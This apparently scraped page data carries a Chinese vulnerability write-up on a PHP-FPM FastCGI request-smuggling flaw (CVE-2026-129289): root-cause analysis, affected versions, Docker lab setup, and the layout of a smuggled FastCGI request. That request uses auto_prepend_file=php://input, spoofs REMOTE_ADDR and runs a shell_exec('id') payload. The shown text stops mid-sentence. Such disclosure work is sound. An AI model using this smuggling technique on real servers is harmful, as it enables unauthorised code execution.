[{"_1":2,"_3":4},"root",{"_5":182},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1795912836000,"id","dxxqjaqglxg4apdale1xcta81","title","PHP-FPM FastCGI 连接复用请求走私漏洞 CVE-2026-129289 分析与复现","originalTitle","CVE-2026-129289 PHP-FPM FastCGI 连接复用请求走私漏洞分析与复现","summary","PHP-FPM FastCGI 连接复用漏洞 CVE-2026-129289 可在 multipart 解析异常后残留伪造请求，以未授权身份执行第二个 FastCGI 请求并触发 www-data RCE，CVSS 4.0 为 9.2。","reason","文章从请求体残留、连接复用与状态控制三个环节拆解利用链，并提供可复现实验和修复版对照，便于评估自身部署是否具备命中条件。","source",{"_72":181},"links",{"_172":180},"publishedAt","2026-11-24T16:05:14.000Z","discoveredAt","2026-11-26T09:40:21.107Z","timelineAt","category","disclosure","tags",[175,176,177,178,73,179],"score",88,"selected",true,"channel","news","story",{"_77":78,"_13":79},"x","readingMode","full","author","body",{"_61":171,"_172":-5,"_173":172,"_174":37},"outline",[80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108],"relatedStories",[76],"topics",[68,69],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fNDXi3RUskmg","reportCount",1,"additionalSourceCount",0,{"_70":74,"_72":75},{"_70":71,"_72":73},"slug","research","name","技术研究","vuln","漏洞披露",{"_77":78,"_13":79},"publicId","77181d1b-7577-47cf-bc79-7cb098d37999","PHP-FPM FastCGI 请求走私漏洞 CVE-2026-129289 分析复现",{"_11":169,"_110":170,"_112":113},{"_11":167,"_110":168,"_112":116},{"_11":165,"_110":166,"_112":116},{"_11":163,"_110":164,"_112":113},{"_11":161,"_110":162,"_112":116},{"_11":159,"_110":160,"_112":116},{"_11":157,"_110":158,"_112":116},{"_11":155,"_110":156,"_112":113},{"_11":153,"_110":154,"_112":116},{"_11":151,"_110":152,"_112":116},{"_11":149,"_110":150,"_112":113},{"_11":147,"_110":148,"_112":116},{"_11":145,"_110":146,"_112":116},{"_11":143,"_110":144,"_112":116},{"_11":141,"_110":142,"_112":116},{"_11":139,"_110":140,"_112":116},{"_11":137,"_110":138,"_112":116},{"_11":135,"_110":136,"_112":113},{"_11":133,"_110":134,"_112":116},{"_11":131,"_110":132,"_112":116},{"_11":129,"_110":130,"_112":116},{"_11":127,"_110":128,"_112":116},{"_11":125,"_110":126,"_112":116},{"_11":123,"_110":124,"_112":116},{"_11":121,"_110":122,"_112":113},{"_11":119,"_110":120,"_112":116},{"_11":117,"_110":118,"_112":116},{"_11":114,"_110":115,"_112":116},{"_11":109,"_110":111,"_112":113},"sec-29","text","参考链接","level",2,"sec-28","4、拿不到补丁时的调用侧处理",3,"sec-27","3、修复之后测试","sec-26","2、关键那一行或那一处","sec-25","六、修复建议","sec-24","6、同一路径的另一种写法","sec-23","5、不开调试或日志时为什么看不到","sec-22","4、落点为什么在那里","sec-21","3、关键轮次或关键状态","sec-20","2、校验为什么没拦住","sec-19","1、输入怎么被解析或应用","sec-18","五、漏洞分析","sec-17","6、执行身份与落点","sec-16","5、命中与执行","sec-15","4、客户端与容器启动","sec-14","3、输入","sec-13","2、环境","sec-12","1、目录结构","sec-11","四、复现过程","sec-10","2、攻击者能拿到的效果","sec-9","1、落点落在什么地方","sec-8","三、危害","sec-7","3、触发条件","sec-6","2、攻击面","sec-5","1、组件定位","sec-4","二、影响组件与攻击面","sec-3","2、受影响的版本与修复状态","sec-2","1、漏洞本身","sec-1","一、漏洞说明","<p>一条 12 KB 的 multipart 请求，前 5 KB 被 PHP 的 multipart 解析器读走，后 7 KB 留在 FastCGI 的 STDIN 记录里。只要前端把后端连接留着，PHP-FPM 就会把这段残留当成下一个请求。把 <code>SCRIPT_FILENAME</code>、<code>REMOTE_ADDR</code>、<code>PHP_ADMIN_VALUE</code> 塞进残留，第二个请求就能以 <code>www-data</code> 执行任意 PHP 代码。</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>项目</p></td><td colspan=\"1\" rowspan=\"1\"><p>内容</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVE</p></td><td colspan=\"1\" rowspan=\"1\"><p>CVE-2026-129289（GHSA-qc49-hpvq-g2w6）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>组件</p></td><td colspan=\"1\" rowspan=\"1\"><p>PHP-FPM、FastCGI SAPI、multipart 解析器</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>受影响</p></td><td colspan=\"1\" rowspan=\"1\"><p>PHP <code>&lt; 8.2.36</code>、<code>8.3.0–8.3.36</code>、<code>8.4.0–8.4.27</code>、<code>8.5.0–8.5.12</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>修复</p></td><td colspan=\"1\" rowspan=\"1\"><p>PHP <code>8.2.36</code>、<code>8.3.37</code>、<code>8.4.28</code>、<code>8.5.13</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVSS</p></td><td colspan=\"1\" rowspan=\"1\"><p>4.0 9.2（CVE.org）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>披露</p></td><td colspan=\"1\" rowspan=\"1\"><p>2026-11-19</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>KEV</p></td><td colspan=\"1\" rowspan=\"1\"><p>截至 2026-11-20 未进入 KEV 目录</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>前提</p></td><td colspan=\"1\" rowspan=\"1\"><p>前端复用 FastCGI 连接；请求体在 5120 边界留下伪造记录；RCE 需要已知脚本路径</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>效果</p></td><td colspan=\"1\" rowspan=\"1\"><p>未授权第二个 FastCGI 请求；<code>www-data</code> RCE；<code>REMOTE_ADDR</code> 可伪造</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>实验</p></td><td colspan=\"1\" rowspan=\"1\"><p>PHP 8.4.27 官方镜像与 8.4.28 源码构建；nginx 1.27.5、Apache 2.4.71；直连 FPM、nginx、Apache 三条路径</p></td></tr></tbody></table><h2 id=\"sec-1\">一、漏洞说明</h2><h3 id=\"sec-2\">1、漏洞本身</h3><p>PHP-FPM 通过 FastCGI 协议接收请求。一个 FastCGI 请求由 BEGIN_REQUEST、PARAMS、STDIN 等记录组成，STDIN 记录里放 HTTP 请求体。连接可以被前端复用：nginx 打开 <code>fastcgi_keep_conn on</code>，Apache 的 <code>mod_proxy_fcgi</code> 打开 <code>enablereuse=on</code>，或者 FPM 直接暴露在网络上，都会让同一个 TCP 连接承载多个请求。</p><p>问题出在“请求体有没有读完”这件事。multipart 解析器有一个 5 KiB 的填充单元，<code>main/rfc1867.c:187</code> 写的是：</p><pre><code>#define FILLUNIT (1024 * 5)</code></pre><p>解析器按这个单元往缓冲区里读。攻击者把伪造的 FastCGI 记录放在第二个填充单元的起点，解析器读到那里时，看到的第一行不是合法的 MIME 头，就在 <code>main/rfc1867.c:1027</code> 报“File Upload Mime headers garbled”，然后 <code>goto fileupload_done</code> 结束解析。后面的字节没有被解析，仍留在 FPM 的 STDIN 记录里。</p><p>请求关闭时，<code>main/SAPI.c:501</code> 先看 <code>SG(request_info).request_body</code> 是否存在；存在就跳过 drain，不存在时才检查 <code>SG(post_read)</code>：</p><pre><code>if (SG(request_info).request_body) {\n    SG(request_info).request_body = NULL;\n} else if (SG(server_context)) {\n    if (!SG(post_read)) {\n        /* make sure we've consumed all request input data */\n        char dummy[SAPI_POST_BLOCK_SIZE];\n        size_t read_bytes;\n\n        do {\n            read_bytes = sapi_read_post_block(dummy, SAPI_POST_BLOCK_SIZE);\n        } while (SAPI_POST_BLOCK_SIZE == read_bytes);\n    }\n}</code></pre><p>只要 body stream 存在，<code>else if</code> 分支就不执行，未读的 6880 字节留在连接里；body stream 不存在时，<code>post_read</code> 是 0，<code>else if</code> 里的 drain 会执行，把剩余字节读掉。</p><p>下一次 <code>fcgi_read_request()</code> 进来时，<code>main/fastcgi.c:1044</code> 先把 <code>req-&gt;in_len</code> 清零，再把连接上的下一段字节当成新的 FastCGI 请求读取。伪造记录正好从 FastCGI 记录头开始，于是第二个请求成立。</p><p>这条链的本质不是“multipart 解析错误”，而是请求体的所有权在三个角色之间没有闭合：解析器认为自己读到了出错点，应用没有读剩余部分，连接复用层则认为上一个请求已经结束。三层各说各话，残留字节就变成了下一个请求的入口。</p><h3 id=\"sec-3\">2、受影响的版本与修复状态</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>分支</p></td><td colspan=\"1\" rowspan=\"1\"><p>受影响版本</p></td><td colspan=\"1\" rowspan=\"1\"><p>修复版本</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>PHP 8.2</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>&lt; 8.2.36</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>8.2.36</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>PHP 8.3</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>8.3.0–8.3.36</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>8.3.37</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>PHP 8.4</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>8.4.0–8.4.27</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>8.4.28</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>PHP 8.5</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>8.5.0–8.5.12</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>8.5.13</p></td></tr></tbody></table><h2 id=\"sec-4\">二、影响组件与攻击面</h2><h3 id=\"sec-5\">1、组件定位</h3><p>漏洞在 PHP 的 FastCGI SAPI 和 multipart 解析器，不在 nginx 或 Apache。前端只提供两件事：把 HTTP body 转成 FastCGI STDIN，以及决定请求结束后关不关后端连接。PHP-FPM 的 worker 在同一个连接上循环调用 <code>fcgi_read_request()</code>；只要连接还开着，它就会继续读下一组 FastCGI 记录。</p><p>nginx 的 <code>fastcgi_keep_conn</code> 默认是 <code>off</code>，这种情况下每个请求结束后上游连接关闭，残留字节随连接一起消失，攻击链断在第一步。显式打开 <code>fastcgi_keep_conn on</code> 的部署才会走到连接复用这一层。Apache 的 <code>mod_proxy_fcgi</code> 默认 <code>enablereuse=off</code>，打开 <code>enablereuse=on</code> 时同样命中；HAProxy 保留 FastCGI 后端连接、LSAPI 也有各自的复用方式。FPM 如果直接暴露在不可信网络上，攻击者不需要前端，直接对 9000 端口说 FastCGI 即可。</p><h3 id=\"sec-6\">2、攻击面</h3><p>攻击面是任何接受 <code>multipart/form-data</code> 的 PHP 端点，但外请求脚本要打开 <code>php://input</code> 并且不读到结尾。原因是 multipart 请求里，<code>request_body</code> 流只在脚本打开 <code>php://input</code> 时创建；流存在时，<code>sapi_deactivate_module()</code> 的第一个分支直接跳过 drain，剩余 6880 字节留在连接里。脚本不打开 <code>php://input</code> 时 <code>request_body</code> 为空，走到 <code>else if</code>，<code>post_read</code> 为 0，drain 执行，残留被读掉。</p><p>换句话说，条件是“打开 <code>php://input</code> 且没有读完”，不是“只要请求是 multipart”。</p><p>攻击者需要控制的输入有三段：</p><ul><li><p>multipart body 的前缀和填充，决定解析器停在哪。</p></li></ul><ul><li><p>偏移 5120 处的伪造 FastCGI 请求，决定第二个请求的参数。</p></li></ul><ul><li><p>伪造请求的 STDIN，决定 <code>auto_prepend_file=php://input</code> 时执行什么。</p></li></ul><p>RCE 还需要一个已知的、存在的 PHP 脚本路径。公告把这一条列为 FPM 代码执行路径的前提；实验里用的是 <code>/var/www/html/open.php</code>。没有已知脚本路径时，伪造请求仍可 dispatch 一个存在的脚本、伪造 <code>REMOTE_ADDR</code>、改 <code>PHP_ADMIN_VALUE</code>，但不一定能直接执行任意代码。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001515-3bd9ae2e-e822-1.svg&amp;mode=full&amp;exp=1796169600&amp;sig=42645d279f388f37\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001515-3bd9ae2e-e822-1.svg&amp;mode=thumb&amp;exp=1796169600&amp;sig=d05ad6b12f2051ea 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001515-3bd9ae2e-e822-1.svg&amp;mode=image-1200&amp;exp=1796169600&amp;sig=0e56322a254d9ba7 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001515-3bd9ae2e-e822-1.svg&amp;mode=full&amp;exp=1796169600&amp;sig=42645d279f388f37 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"993\"></p><h3 id=\"sec-7\">3、触发条件</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>前提</p></td><td colspan=\"1\" rowspan=\"1\"><p>公告 / 线索声称</p></td><td colspan=\"1\" rowspan=\"1\"><p>实测</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>认证</p></td><td colspan=\"1\" rowspan=\"1\"><p>无</p></td><td colspan=\"1\" rowspan=\"1\"><p>无；普通 multipart 请求即可</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>配置</p></td><td colspan=\"1\" rowspan=\"1\"><p>nginx <code>fastcgi_keep_conn on</code>、Apache <code>enablereuse=on</code>、HAProxy 复用、LSAPI</p></td><td colspan=\"1\" rowspan=\"1\"><p>nginx keep on 命中、keep off 未命中；Apache enablereuse=on 命中、off 未命中；直连 FPM 也命中</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>版本</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>&lt; 8.2.36</code>、<code>8.3.0–8.3.36</code>、<code>8.4.0–8.4.27</code>、<code>8.5.0–8.5.12</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>8.4.27 命中；8.4.28 未命中</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>网络位置</p></td><td colspan=\"1\" rowspan=\"1\"><p>能访问前端 HTTP；FPM 不直接暴露</p></td><td colspan=\"1\" rowspan=\"1\"><p>nginx 8080、Apache 8081 可达；FPM 9000 直连也可打</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>编码 / 输入</p></td><td colspan=\"1\" rowspan=\"1\"><p>畸形 multipart；伪造 FastCGI 记录；需已知脚本路径</p></td><td colspan=\"1\" rowspan=\"1\"><p>12000 字节 multipart；hidden 在 5120；RCE 用已知的 <code>open.php</code> 路径</p></td></tr></tbody></table><h2 id=\"sec-8\">三、危害</h2><h3 id=\"sec-9\">1、落点落在什么地方</h3><p>落点在 PHP-FPM 的 worker 里，不在 nginx 或 Apache。第二个请求是 FPM 眼里的一个完整 FastCGI 请求：它有自己的 <code>SCRIPT_FILENAME</code>、<code>REQUEST_METHOD</code>、<code>REMOTE_ADDR</code> 和 <code>PHP_ADMIN_VALUE</code>。实验里的 hidden 请求把 <code>REMOTE_ADDR</code> 设成 <code>203.0.113.1</code>，执行 <code>open.php</code> 时脚本看到的来源就是 <code>203.0.113.1</code>；同时把 <code>PHP_ADMIN_VALUE</code> 设成 <code>allow_url_include=1</code> 和 <code>auto_prepend_file=php://input</code>，让 hidden 请求的 STDIN 在脚本执行前被当成 PHP 代码 include。</p><p>落点文件是 <code>/tmp/rce.txt</code>，内容是：</p><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><p>另一条落点是 <code>/tmp/smuggled.txt</code>，内容是：</p><pre><code>REMOTE_ADDR=203.0.113.1</code></pre><p>这两个文件都是 hidden 请求写的；外请求只负责把 body 送到 FPM，实验里的 <code>open.php</code> 打开 <code>php://input</code> 但不读。直连 FPM 时两个请求的响应都会回到同一个 socket；走 nginx 或 Apache 时，第二个响应会被前端当成上游多余数据吞掉，HTTP 响应体里只剩 <code>outer</code>。响应看不到，副作用文件还在。</p><h3 id=\"sec-10\">2、攻击者能拿到的效果</h3><ul><li><p>以 FPM worker 用户执行任意 PHP 代码。官方镜像里是 <code>www-data</code>（uid 33），文件读写、数据库连接、应用密钥、日志目录都落在这个身份的可达范围内。</p></li></ul><ul><li><p>伪造 <code>REMOTE_ADDR</code>。脚本里的 IP 白名单、管理接口的来源判断、审计日志里的客户端地址，读到的都是 hidden 请求给的值。</p></li></ul><ul><li><p>通过 <code>PHP_ADMIN_VALUE</code> 改单次请求的 PHP 配置。<code>auto_prepend_file=php://input</code> 只是其中一种写法；关闭 <code>open_basedir</code>、改 <code>allow_url_include</code>、换错误日志路径，都可以在 hidden 请求里试。</p></li></ul><ul><li><p>dispatch 一个不在暴露路由里的脚本。伪造请求的 <code>SCRIPT_FILENAME</code> 不要求是 URL 能访问到的入口，只要文件存在且 FPM 可读。</p></li></ul><ul><li><p>把第二个请求的输出藏起来。nginx 和 Apache 都只把第一个响应交回客户端，第二个响应留在上游连接里；只看 HTTP 响应体和 HTTP access log 会漏判。</p></li></ul><p>代码执行的身份是 FPM worker，拿不到 root 不会自动发生；RCE 需要已知脚本路径；前端不复用连接时整条链不成立。默认 nginx 和默认 Apache 的配置不在受影响面里，这一点限制了实际暴露面。</p><h2 id=\"sec-11\">四、复现过程</h2><h3 id=\"sec-12\">1、目录结构</h3><pre><code>20261120_phpsmuggle-lab/\n├── app/                        # 实验目录，挂进容器的 /var/www/html\n│   ├── open.php                # 打开 php://input 但不读；\n│   ├── read1.php               # 只读 1 字节；partial 记录路径\n│   ├── plain.php               # 只有 echo；证明任意脚本都能当外请求\n│   ├── openread.php            # 读完 php://input；对照组\n│   └── noopen.php              # 不打开 php://input；对照组\n├── fcgi_client.py              # FastCGI 客户端：构造、发送、解析\n├── nginx.conf                  # keep_conn on / off 两个入口，以及修复版入口\n├── apache-on.conf              # ProxySet enablereuse=on\n├── apache-off.conf             # ProxySet enablereuse=off\n├── fpm-access.conf             # 漏洞版 FPM 的 access log 配置\n├── php-fpm-8428.conf           # 修复版 FPM 配置\n├── build_fixed_host.sh         # 8.4.28 源码构建\n└── restart_fixed.sh            # 重启修复版 FPM</code></pre><h3 id=\"sec-13\">2、环境</h3><p>漏洞版用官方镜像 <code>php:8.4.27-fpm</code>，修复版用 PHP 8.4.28 源码构建；前端用 <code>nginx:1.27-alpine</code>（响应头 <code>Server: nginx/1.27.5</code>）和 <code>httpd:2.4</code>（Apache/2.4.71）。两个 PHP 版本都只走 FPM，不启用 LSAPI。</p><p>先拉镜像：</p><pre><code>docker pull php:8.4.27-fpm\ndocker pull nginx:1.27-alpine</code></pre><p>起漏洞版容器检查端口：</p><pre><code>ss -ltn | grep -E ':(9000|9001|9002|8080|8081|8082)\\b' || echo no-conflict\nmkdir -p /opt/phpfpm-smuggle-lab/app\ndocker rm -f phpfpm-vuln &gt;/dev/null 2&gt;&amp;1\ndocker run -d --name phpfpm-vuln \\\n  -p 9000:9000 \\\n  -v /opt/phpfpm-smuggle-lab/app:/var/www/html \\\n  php:8.4.27-fpm</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001516-3c27be81-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=5a75363e6e6fbd46\" loading=\"lazy\" decoding=\"async\" width=\"805.1948095578371\" height=\"235\"></p><p>容器 ID ：</p><pre><code>docker exec phpfpm-vuln php -v | head -2\ndocker ps --filter name=phpfpm-vuln | grep -v phpfpm-vuln-log</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001516-3c72a95b-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=87a5c961b627dd62\" loading=\"lazy\" decoding=\"async\" width=\"1377.4350723988402\" height=\"179\"></p><p>起 nginx，把它和漏洞容器放进同一个 Docker 网络：</p><pre><code>docker network create phpfpm-lab 2&gt;/dev/null || true\ndocker network connect phpfpm-lab phpfpm-vuln 2&gt;/dev/null || true\ndocker rm -f phpfpm-nginx &gt;/dev/null 2&gt;&amp;1\ndocker run -d --name phpfpm-nginx \\\n  --network phpfpm-lab \\\n  --add-host host.docker.internal:host-gateway \\\n  -p 8080:80 \\\n  -v /opt/phpfpm-smuggle-lab/nginx.conf:/etc/nginx/nginx.conf:ro \\\n  nginx:1.27-alpine\ndocker exec phpfpm-nginx nginx -t</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001517-3cbe30b7-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=32b5d46032a437ce\" loading=\"lazy\" decoding=\"async\" width=\"827.9220824082599\" height=\"291\"></p><pre><code>docker pull httpd:2.4\ndocker run --rm httpd:2.4 httpd -v</code></pre><p>检查版本：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001517-3d060139-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=c159e1f2630e11ed\" loading=\"lazy\" decoding=\"async\" width=\"952.1103947694988\" height=\"193\"></p><p>两个 Apache 容器共用同一份配置，只差 <code>ProxySet enablereuse=on|off</code>。一个开在 8081，一个开在 8082：</p><pre><code>docker rm -f httpd-fcgi-on httpd-fcgi-off &gt;/dev/null 2&gt;&amp;1\ndocker run -d --name httpd-fcgi-on \\\n  --network phpfpm-lab \\\n  -p 8081:80 \\\n  -v /opt/phpfpm-smuggle-lab/app:/var/www/html:ro \\\n  -v /opt/phpfpm-smuggle-lab/apache-on.conf:/usr/local/apache2/conf/httpd.conf:ro \\\n  httpd:2.4\ndocker run -d --name httpd-fcgi-off \\\n  --network phpfpm-lab \\\n  -p 8082:80 \\\n  -v /opt/phpfpm-smuggle-lab/app:/var/www/html:ro \\\n  -v /opt/phpfpm-smuggle-lab/apache-off.conf:/usr/local/apache2/conf/httpd.conf:ro \\\n  httpd:2.4\ndocker exec httpd-fcgi-on httpd -t\ndocker exec httpd-fcgi-off httpd -t</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001518-3d5909ee-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=5b2bebbb0cb0e3e9\" loading=\"lazy\" decoding=\"async\" width=\"1041.396109539017\" height=\"432\"></p><p>修复版没有现成镜像可用，用源码构建：</p><pre><code>cd /tmp\ncurl -fsSL -C - --max-time 280 https://www.php.net/distributions/php-8.4.28.tar.gz \\\n  -o /tmp/php8428.tar.gz\ntar xzf /tmp/php8428.tar.gz\ncd /tmp/php-8.4.28\n./configure --disable-all --enable-fpm --disable-libxml \\\n  --prefix=/opt/php8428 \\\n  --with-config-file-path=/opt/php8428/etc \\\n  --without-pear\nmake -j4\nmake install</code></pre><p>构建关键行节选：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001518-3dbcfa61-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=cebd7f2b107bfe6a\" loading=\"lazy\" decoding=\"async\" width=\"1383.116890611446\" height=\"511\"></p><pre><code>/opt/php8428/bin/php -v | head -1</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001519-3e02605d-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=37085fa9256b3ee0\" loading=\"lazy\" decoding=\"async\" width=\"570.6168862088301\" height=\"97\"></p><p>起修复版 FPM：</p><pre><code>mkdir -p /var/www/html\nfor f in open.php read1.php plain.php openread.php noopen.php; do\n  ln -sf /opt/phpfpm-smuggle-lab/app/$f /var/www/html/$f\ndone\ncat /var/www/html/open.php | head -2</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001519-3e498b0f-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=10c03d79b26af4cd\" loading=\"lazy\" decoding=\"async\" width=\"1053.571434280315\" height=\"183\"></p><pre><code>nohup /opt/php8428/sbin/php-fpm -F \\\n  -y /opt/phpfpm-smuggle-lab/php-fpm-8428.conf \\\n  &gt;/tmp/php-fpm8428.out 2&gt;&amp;1 &amp;\nsleep 1\nss -ltn | grep 9001</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001520-3e93213e-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=9f4d09517293a628\" loading=\"lazy\" decoding=\"async\" width=\"838.4740305173848\" height=\"218\"></p><h3 id=\"sec-14\">3、输入</h3><p>输入是一条 multipart 请求体。body 总长 12000 字节，边界是 <code>B</code>，前 39 字节是普通的 form-data 前缀，后面用 <code>A</code> 填满；伪造的 FastCGI 请求放在偏移 5120：</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>偏移</p></td><td colspan=\"1\" rowspan=\"1\"><p>内容</p></td><td colspan=\"1\" rowspan=\"1\"><p>长度</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>0–38</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>--B\\r\\nContent-Disposition: form-data\\r\\n\\r\\n</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>39</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>39–5119</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>A</code> 填充</p></td><td colspan=\"1\" rowspan=\"1\"><p>5081</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>5120–5359</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>hidden FastCGI 请求（marker）</p></td><td colspan=\"1\" rowspan=\"1\"><p>240</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>5360–11999</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>A</code> 填充</p></td><td colspan=\"1\" rowspan=\"1\"><p>6640</p></td></tr></tbody></table><p>RCE 模式下 hidden 请求更长，是 410 字节，从 5120 到 5529，后面的 <code>A</code> 填充相应缩短。hidden 请求不是 HTTP 请求，是一组 FastCGI 记录：BEGIN_REQUEST（<code>keep=0</code>）、PARAMS、STDIN。参数如下：</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>参数</p></td><td colspan=\"1\" rowspan=\"1\"><p>marker 请求</p></td><td colspan=\"1\" rowspan=\"1\"><p>RCE 请求</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>REQUEST_METHOD</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>GET</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>POST</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>SCRIPT_FILENAME</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>/var/www/html/open.php</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>/var/www/html/open.php</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>SCRIPT_NAME</code> / <code>REQUEST_URI</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>/h.php</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>/open.php</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>REMOTE_ADDR</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>203.0.113.1</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>203.0.113.1</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>CONTENT_TYPE</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>无</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>application/x-www-form-urlencoded</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>CONTENT_LENGTH</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>0</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>payload 的长度</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>PHP_ADMIN_VALUE</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>无</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>allow_url_include=1</code> 换行 <code>auto_prepend_file=php://input</code></p></td></tr></tbody></table><p>RCE 请求的 STDIN ：</p><pre><code>&lt;?php file_put_contents('/tmp/rce.txt', shell_exec('id')); ?&gt;</code></pre><p><code>PHP_ADMIN_VALUE</code> 让这个 STDIN 在 <code>open.php</code> 执行前被当成 PHP include；<code>shell_exec('id')</code> 的结果写进 <code>/tmp/rce.txt</code>。marker 请求没有 <code>PHP_ADMIN_VALUE</code>，只把 <code>REMOTE_ADDR</code> 设成 <code>203.0.113.1</code>，<code>open.php</code> 看到这个值就写 <code>/tmp/smuggled.txt</code> 并输出 <code>smuggled</code>，用来证明第二个请求确实换了来源。</p><p>partial 